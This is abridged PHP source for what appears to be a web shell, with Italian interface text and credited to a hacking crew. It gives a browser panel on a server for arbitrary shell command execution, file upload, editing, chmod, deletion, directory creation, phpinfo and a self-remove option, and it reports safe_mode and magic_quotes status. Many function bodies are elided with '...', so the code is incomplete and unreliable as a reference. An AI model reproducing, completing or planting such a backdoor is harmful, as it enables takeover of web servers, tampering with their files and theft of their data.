...
function getinfo()
{
    ...
    $info .= ((0 == ini_get('safe_mode')) ? '[~]Safe Mode: <font color="#00FF33">OFF</font><br />' : '[~]Safe Mode: <font color="#FF3300">OFF</font><br />');
    $info .= ((0 == ini_get('magic_quotes_gpc')) ? '[~]Magic Quotes: <font color="#00FF33">OFF</font><br />' : '[~]Magic Quotes: <font color="#FF3300">ON</font><br />');
...
echo $home . '<center><a href = "' . $_SERVER['PHP_SELF'] . '"><img src = "http://img367.imageshack.us/img367/9834/bannerdc2bygu.png" border = "none"></a></center>';
echo "<hr size=\"1\" width=\"60%\" noshade />\n<div id = \"info\">[~]Directory corrente: " . getcwd() . '<br />' . getinfo() . "</div>\n<hr size=\"1\" width=\"60%\" noshade />";

echo "<table width = 60% height = 10% align = \"center\">\n";
echo "<tr>\n";
echo "<td>[ <a class = \"head\" href = '" . $c . "&mode=create'>New</a> ]</td>\n";
echo "<td>[ <a class = \"head\" href = '" . $c . "&mode=phpinfo'>PHP Info</a> ]</td>\n";
echo "<td>[ <a class = \"head\" href = '" . $c . "&mode=nopaste&action=ins'>No-Paste</a> ]</td>\n";
echo "<td>[ <a class = \"head\" href = '" . $c . "&mode=execute'>Shell Command</a> ]</td>\n";
echo "<td>[ <a class = \"head\" href = '" . $c . "&mode=hasher'>Hasher</a> ]</td>\n";
echo "<td>[ <a class = \"head\" href = '" . $c . "&mode=selfremove'>Self Remove</a> ]</td>\n";
...
switch ($mode) {
    case 'edit':
        ...
        if (empty($new)) {
            ...
            echo "<form action = '" . $c . '&mode=edit&file=' . $file . "' method = 'POST'>\n";
            echo 'File: ' . $file . "<br />\n";
            echo "<textarea name = 'new' rows = '25' cols = '100'>" . $cont . "</textarea><br />\n";
            ...
            if (fwrite($fp, $new)) {
                ...
                echo 'Impossibile editare ' . $file . "<br />\n";
    ...
    case 'upload':
        ...
        if (!empty($file)) {
            if (move_uploaded_file($temp, $file)) {
                ...
                echo 'Impossibile caricare ' . $file . "\n";
                echo "<a href=\"javascript:history.go(-1)\">Indietro</a><br /><br />\n";
            }
        }
        break;
    ...
    case 'rename':
        $old = $_GET['old'];
        echo "<form action = '" . $c . '&mode=rename&old=' . $old . "' method = 'POST'>\n";
        ...
        break;
    case 'chmod':
        if (false == chmod($_POST['tomod'], intval($_POST['mod'], 8))) {
            echo 'Impossibile cambiare i permessi a ' . $_POST['tomod'] . '<br />';
            echo "<a href=\"javascript:history.go(-1)\">Indietro</a><br /><br />\n";
        } else {
            header('Location: http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?dir=' . $dir);
    ...
    case 'remove':
        ...
        if (unlink($file)) {
            ...
            echo 'Impossibile rimuovere ' . $file . " <br />\n";
            echo "<a href=\"javascript:history.go(-1)\">Indietro</a><br /><br />\n";
        }
        break;
    case 'selfremove':
        ...
        break;
    case 'makedir':
        if (false == mkdir($_POST['dir'], 0777)) {
            echo 'Impossibile creare directory; ' . $_POST['dir'] . " <br />\n";
            echo "<a href=\"javascript:history.go(-1)\">Indietro</a><br /><br />\n";
        } else {
    ...
    case 'create':
        ...
        if (isset($_POST['new'])) {
            ...
            echo "<form action = '" . $c . "&mode=create' method = 'POST'>\n";
    ...
    case 'nopaste':
            switch ($_GET['action']) {
                case 'ins':
                    ...
                    echo "Script: <br /><textarea name = 'source' rows = '30' cols = '50'></textarea><br />\n";
    ...
    case 'execute':
        ...
        if (!isset($_POST['command'])) {
            ...
            if ('' == $ret) {
                echo "Il comando non puo' essere eseguito sul server<br /><br /><br />\n";
            } else {
                echo "Executing the following command:<br />\n";
                echo "<textarea rows = '5' cols = '60'>" . $command . "</textarea><br />\n";
                echo "Result:<br /> <textarea rows = '5' cols = '60'>" . $ret . "</textarea><br /><br /><br />\n";
            }
        }
        break;
    case 'hasher':
        ...
        echo "<tr>\n<td><select name = 'type'>\n";
        echo "<option>md4</option>\n";
        echo "<option>md5</option>\n";
        echo "<option>sha1</option>\n";
        echo "<option>gost</option>\n";
        echo "<option>crc32</option>\n";
        echo "<option>adler32</option>\n";
        echo "<option>whirlpool</option>\n";
        echo "</select></td>\n</tr>";
        echo "<tr>\n<td><input type = 'submit' value = 'hash'></td>\n</tr></form>\n</table>";
        if (!empty($_POST['hash']) && !empty($_POST['type'])) {
            echo $_POST['hash'] . ': ' . '<b>' . hash($_POST['type'], $_POST['hash']) . '</b>';
        }
        break;
    case 'phpinfo':
        phpinfo();
    ...
    default:
        ...
        foreach ($files as $out) {
            if (is_file($out)) {
                ...
                echo '<td width = "10%" class = "list">' . view_size(filesize($out)) . '</td>';
                echo '<td class = "list"><div id = "perm">' . getperms($out) . "</div></td>\n";
                echo "<td class = \"list\" align = \"right\"><a href = '" . $c . '&mode=edit&file=' . $out . "'><img src = 'http://img189.imageshack.us/img189/9858/editj.gif' alt = \"edita file\" border = \"none\"></a>
                ...
                if ('.' != $out && '..' != $out) {
                    ...
                    echo '<td width = "10%" class = "list">FOLDER</td>';
                    echo '<td class = "list"><div id = "perm">' . getperms($out) . "</div></td>\n";
                    echo "<td class = \"list\" align = \"right\"><a href = '" . $c . '&mode=elimina&dire=' . $out . "'><img src = 'http://img193.imageshack.us/img193/9589/deletef.gif' alt = \"elimina directory\" border = \"none\"></a></td>\n</tr>";
                }
                if ('..' == $out) {
                    echo '<td width = "55%" class = "list"><a href = ' . $c . '/' . $out . ">..</a></td>\n";
                }
            }
        }
    echo "</table>\n";
...
echo "<table id = \"foot\">
    ...
    echo '<center>[ Generation time: ' . round(getTime() - startTime, 4) . " seconds | by <a href=\"http://lostpassword.hellospace.net\">lostpassword</a> and <a href = \"http://www.d3vilc0de.org\">D3vilc0de crew</a> ]</center>\n</body>\n</html>";
